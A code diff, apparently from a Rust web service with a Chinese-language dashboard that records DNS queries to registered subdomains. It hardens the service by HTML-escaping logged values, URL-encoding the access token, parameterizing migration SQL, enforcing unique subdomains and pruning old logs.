+            h += '<div class="log-section"><div class="log-section-header"><span class="log-section-title">' + escapeHtml(item.subdomain) + '</span><span class="badge ' + (item.log_count>0?'':'badge-muted') + '">' + escapeHtml(item.log_count) + '</span></div>';
             if (item.logs.length > 0) {{
                 h += '<table class="log-table"><thead><tr><th>类型</th><th>请求域名</th><th>IP 地址</th><th>归属地</th><th>时间</th></tr></thead><tbody>';
                 item.logs.forEach(function(log) {{
                     var k = log.domain+'|'+log.client_ip+'|'+log.timestamp;
                     var isNew = !knownLogIds[k]; knownLogIds[k] = true;
-                    h += '<tr class="'+(isNew?'log-new':'')+'"><td>'+recordTypeBadge(log.record_type)+'</td><td class="log-domain">'+log.domain+'</td><td class="log-ip">'+log.client_ip+'</td><td class="log-region">'+(log.ip_region||'-')+'</td><td class="log-time">'+relativeTime(log.timestamp)+'<span class="log-time-abs">'+log.timestamp+'</span></td></tr>';
+                    h += '<tr class="'+(isNew?'log-new':'')+'"><td>'+recordTypeBadge(log.record_type)+'</td><td class="log-domain">'+escapeHtml(log.domain)+'</td><td class="log-ip">'+escapeHtml(log.client_ip)+'</td><td class="log-region">'+escapeHtml(log.ip_region||'-')+'</td><td class="log-time">'+escapeHtml(relativeTime(log.timestamp))+'<span class="log-time-abs">'+escapeHtml(log.timestamp)+'</span></td></tr>';
                 }});
                 h += '</tbody></table>';
             }} else {{ h += '<div style="padding:20px;text-align:center;color:var(--text-muted);font-size:13px;">等待 DNS 查询...</div>'; }}
@@ -855,14 +1129,14 @@ function fetchLogs() {{
 }}
 
 function createSubdomain() {{
-    fetch('/api/newsub?token=' + TOKEN, {{method:'POST'}}).then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
+    fetch('/api/newsub?token=' + encodeURIComponent(TOKEN), {{method:'POST'}}).then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
     .then(function(res) {{ if (res.ok) {{ showToast('创建成功: ' + res.data.new_sub, 'success'); fetchSubdomains(); fetchLogs(); }} else {{ showToast(res.data.error||'创建失败', 'error'); }} }})
     .catch(function() {{ showToast('网络错误', 'error'); }});
 }}
 
 function deleteSubdomain(sub) {{
     if (!confirm('确定删除子域名 ' + sub + ' 及其所有日志记录？')) return;
-    fetch('/api/subdomain?token=' + TOKEN + '&subdomain=' + encodeURIComponent(sub), {{method:'DELETE'}})
+    fetch('/api/subdomain?token=' + encodeURIComponent(TOKEN) + '&subdomain=' + encodeURIComponent(sub), {{method:'DELETE'}})
     .then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
     .then(function(res) {{
         if (res.ok) {{ showToast('已删除: ' + sub, 'success'); fetchSubdomains(); fetchLogs(); }}
@@ -872,7 +1146,7 @@ function deleteSubdomain(sub) {{
 
 function clearLogs() {{
     if (!confirm('确定清空所有 DNS 日志？')) return;
-    fetch('/api/clear?token=' + TOKEN, {{method:'POST'}}).then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
+    fetch('/api/clear?token=' + encodeURIComponent(TOKEN), {{method:'POST'}}).then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
     .then(function(res) {{ if (res.ok) {{ showToast('已清空 ' + res.data.cleared + ' 条日志', 'success'); knownLogIds = {{}}; fetchLogs(); }} else {{ showToast(res.data.error||'清空失败', 'error'); }} }})
     .catch(function() {{ showToast('网络错误', 'error'); }});
 }}
@@ -888,9 +1162,14 @@ fetchSubdomains(); fetchLogs();
 setInterval(function() {{ fetchLogs(); fetchSubdomains(); }}, 3000);
 </script>
 </body>
-</html>"##, token = token);
+</html>"##,
+        token_html = token_html,
+        token_js = token_js
+    );
 
-    HttpResponse::Ok().content_type("text/html; charset=utf-8").body(html)
+    HttpResponse::Ok()
+        .content_type("text/html; charset=utf-8")
+        .body(html)
 }
 
 // ---- Main ----
@@ -914,19 +1193,43 @@ async fn main() -> std::io::Result<()> {
         let conn = pool.get().expect("Failed to get DB connection");
         conn.execute_batch(r#"
             CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, token TEXT NOT NULL UNIQUE, access_ip TEXT);
-            CREATE TABLE IF NOT EXISTS subdomains (id INTEGER PRIMARY KEY, user_token TEXT NOT NULL, subdomain TEXT NOT NULL, UNIQUE(user_token, subdomain));
+            CREATE TABLE IF NOT EXISTS subdomains (id INTEGER PRIMARY KEY, user_token TEXT NOT NULL, subdomain TEXT NOT NULL UNIQUE, UNIQUE(user_token, subdomain));
             CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, registered_subdomain TEXT NOT NULL, requested_domain TEXT NOT NULL, client_ip TEXT NOT NULL, ip_region TEXT DEFAULT '', timestamp INTEGER NOT NULL, record_type TEXT DEFAULT 'A');
+            DELETE FROM subdomains WHERE id NOT IN (SELECT MIN(id) FROM subdomains GROUP BY subdomain);
+            CREATE UNIQUE INDEX IF NOT EXISTS idx_subdomains_subdomain_unique ON subdomains(subdomain);
+            CREATE INDEX IF NOT EXISTS idx_subdomains_user_token ON subdomains(user_token);
             CREATE INDEX IF NOT EXISTS idx_logs_subdomain ON logs(registered_subdomain);
             CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp);
             PRAGMA journal_mode = WAL;
         "#).expect("Failed to create tables");
 
+        let _ = conn.execute(
+            "DELETE FROM logs WHERE timestamp < ?1",
+            params![now_ts() - LOG_RETENTION_SECONDS],
+        );
+
         // Migrate columns
-        for (col, def) in &[("record_type", "TEXT DEFAULT 'A'"), ("ip_region", "TEXT DEFAULT ''")] {
-            let has: bool = conn.query_row(
-                &format!("SELECT COUNT(*) FROM pragma_table_info('logs') WHERE name='{}'", col), [], |row| row.get::<_, i64>(0),
-            ).map(|c| c > 0).unwrap_or(false);
-            if !has { let _ = conn.execute(&format!("ALTER TABLE logs ADD COLUMN {} {}", col, def), []); }
+        for (col, alter_sql) in &[
+            (
+                "record_type",
+                "ALTER TABLE logs ADD COLUMN record_type TEXT DEFAULT 'A'",
+            ),
+            (
+                "ip_region",
+                "ALTER TABLE logs ADD COLUMN ip_region TEXT DEFAULT ''",
+            ),
+        ] {
+            let has: bool = conn
+                .query_row(
+                    "SELECT COUNT(*) FROM pragma_table_info('logs') WHERE name = ?1",
+                    params![col],
+                    |row| row.get::<_, i64>(0),
+                )
+                .map(|c| c > 0)
+                .unwrap_or(false);
+            if !has {
+                let _ = conn.execute(alter_sql, []);
+            }
         }
     }
 
@@ -944,7 +1247,11 @@ async fn main() -> std::io::Result<()> {
     });
     let dns_server = tokio::spawn(async move {
         let socket = UdpSocket::bind(&dns_bind).await.expect("绑定 DNS 端口失败");
-        let mut server = ServerFuture::new(MyDnsHandler { pool: pool_dns, ip_tx, response_ip: resp_ip });
+        let mut server = ServerFuture::new(MyDnsHandler {
+            pool: pool_dns,
+            ip_tx,
+            response_ip: resp_ip,
+        });
         server.register_socket(socket);
         server.block_until_done().await.expect("DNS server error");
     });
